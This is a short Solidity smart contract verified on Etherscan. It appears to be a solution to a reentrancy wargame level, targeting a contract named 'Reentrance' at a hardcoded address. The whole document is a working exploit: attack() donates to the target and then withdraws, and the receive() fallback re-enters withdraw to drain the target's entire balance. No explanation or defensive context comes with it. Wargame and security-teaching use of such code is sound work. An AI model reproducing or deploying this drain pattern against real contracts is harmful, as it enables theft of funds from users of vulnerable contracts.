/**
 *Submitted for verification at Etherscan.io on 2022-09-23
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Reentrance {
    function withdraw(uint) external;
    function donate(address _to) external payable;
}

contract Reentracy {
    Reentrance vulnerable = Reentrance(0x373dc63d992cd339FB5EB8E722692e463667077B);

    receive() external payable {
        vulnerable.withdraw(address(vulnerable).balance);
    }

    function attack() public payable {
        vulnerable.donate(address(this));
        vulnerable.withdraw(msg.value);
    }
}